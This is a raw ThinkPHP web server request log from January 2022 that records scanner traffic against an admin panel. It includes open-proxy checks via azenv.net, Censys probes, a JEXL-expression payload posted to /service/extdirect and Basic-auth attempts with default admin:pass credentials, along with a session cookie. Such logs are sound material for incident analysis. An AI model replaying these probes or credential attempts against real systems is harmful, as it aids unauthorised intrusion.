---------------------------------------------------------------
[ 2022-01-04T00:03:20+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.004395s] [吞吐率：227.53req/s] [内存消耗：488.97kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T00:03:21+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.004433s] [吞吐率：225.59req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T01:03:34+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.004296s] [吞吐率：232.77req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T01:03:34+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.004343s] [吞吐率：230.25req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T02:01:27+08:00 ] 138.68.191.159 GET /
[运行时间：0.003872s] [吞吐率：258.25req/s] [内存消耗：487.85kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T02:03:25+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.004077s] [吞吐率：245.27req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T02:03:26+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003181s] [吞吐率：314.37req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T03:03:23+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.004739s] [吞吐率：211.01req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T03:03:24+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.004067s] [吞吐率：245.88req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T03:31:59+08:00 ] 83.97.20.34 GET 113.116.132.17:8081/
[运行时间：0.004039s] [吞吐率：247.60req/s] [内存消耗：488.73kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T04:03:23+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.005032s] [吞吐率：198.73req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T04:03:24+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003577s] [吞吐率：279.56req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T04:35:07+08:00 ] 45.146.165.37 POST 113.116.132.17:8081/service/extdirect
[运行时间：0.062693s] [吞吐率：15.95req/s] [内存消耗：469.13kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'content-length' => '293',
  'content-type' => 'application/json',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/service/extdirect' => '',
  'action' => 'coreui_Component',
  'data' => 
  array (
    0 => 
    array (
      'filter' => 
      array (
        0 => 
        array (
          'property' => 'repositoryName',
          'value' => '*',
        ),
        1 => 
        array (
          'property' => 'expression',
          'value' => '1==1',
        ),
        2 => 
        array (
          'property' => 'type',
          'value' => 'jexl',
        ),
      ),
      'limit' => '50',
      'page' => '1',
      'sort' => 
      array (
        0 => 
        array (
          'direction' => 'ASC',
          'property' => 'name',
        ),
      ),
      'start' => '0',
    ),
  ),
  'method' => 'previewAssets',
  'tid' => '18',
  'type' => 'rpc',
)
---------------------------------------------------------------
[ 2022-01-04T04:42:13+08:00 ] 45.146.165.37 GET 113.116.132.17:8081/
[运行时间：0.004233s] [吞吐率：236.25req/s] [内存消耗：489.99kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'authorization' => 'Basic YWRtaW46cGFzcw==',
  'content-type' => 'application/json',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T04:42:14+08:00 ] 45.146.165.37 GET 113.116.132.17:8081/padmin/adminlogin/index.html
[运行时间：0.003668s] [吞吐率：272.64req/s] [内存消耗：486.88kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'authorization' => 'Basic YWRtaW46cGFzcw==',
  'content-type' => 'application/json',
  'referer' => 'http://113.116.132.17:8081/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T05:03:53+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.004141s] [吞吐率：241.48req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T05:03:54+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003699s] [吞吐率：270.34req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T06:04:29+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.003914s] [吞吐率：255.50req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T06:04:30+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003648s] [吞吐率：274.12req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T07:08:28+08:00 ] 167.248.133.41 GET 113.116.132.17:8081/
[运行时间：0.003521s] [吞吐率：283.99req/s] [内存消耗：488.54kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T07:08:28+08:00 ] 167.248.133.41 GET 113.116.132.17:8081/
[运行时间：0.002896s] [吞吐率：345.32req/s] [内存消耗：489.29kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'user-agent' => 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T07:08:29+08:00 ] 167.248.133.41 GET 113.116.132.17:8081/padmin/adminlogin/index.html
[运行时间：0.003244s] [吞吐率：308.27req/s] [内存消耗：485.84kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'user-agent' => 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T08:03:47+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.003812s] [吞吐率：262.34req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T08:03:47+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.004578s] [吞吐率：218.43req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T08:19:35+08:00 ] 103.145.13.223 GET icanhazip.comhttp://icanhazip.com/
[运行时间：0.005415s] [吞吐率：184.67req/s] [内存消耗：489.05kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'icanhazip.com',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T08:19:36+08:00 ] 103.145.13.223 GET icanhazip.comhttp://icanhazip.com/padmin/adminlogin/index.html
[运行时间：0.003348s] [吞吐率：298.70req/s] [内存消耗：485.76kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'icanhazip.com',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://icanhazip.com/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T08:55:41+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/padmin/index/index.html
[运行时间：0.003956s] [吞吐率：252.79req/s] [内存消耗：498.05kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://pcadmin.aoi.bj/padmin/adminlogin/index.html',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
  '/padmin/index/index_html' => '',
)
---------------------------------------------------------------
[ 2022-01-04T08:55:41+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/padmin/adminlogin/index.html
[运行时间：0.002792s] [吞吐率：358.15req/s] [内存消耗：487.68kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://pcadmin.aoi.bj/padmin/adminlogin/index.html',
  'connection' => 'keep-alive',
  'cookie' => 'PHPSESSID=71jg1g17908ntcrpjiqb3mfvl7',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T09:02:36+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.003900s] [吞吐率：256.41req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T09:02:37+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003559s] [吞吐率：280.99req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T09:24:50+08:00 ] 83.97.20.34 GET 113.116.132.17:8081/
[运行时间：0.003809s] [吞吐率：262.54req/s] [内存消耗：488.73kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T10:02:26+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.004038s] [吞吐率：247.66req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T10:02:27+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003384s] [吞吐率：295.50req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T10:49:37+08:00 ] 113.88.25.57 GET bj.aoi.ddns.us:8081/download/win7/Windows7Loader/
[运行时间：0.008796s] [吞吐率：113.69req/s] [内存消耗：470.85kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'bj.aoi.ddns.us:8081',
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=0',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'referer' => 'http://bj.aoi.ddns.us:8081/download/win7/',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
)
[ info ] [ PARAM ] array (
  '/download/win7/Windows7Loader/' => '',
)
---------------------------------------------------------------
[ 2022-01-04T11:02:30+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.004068s] [吞吐率：245.83req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T11:02:31+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003235s] [吞吐率：309.13req/s] [内存消耗：485.70kb] [文件加载：74]
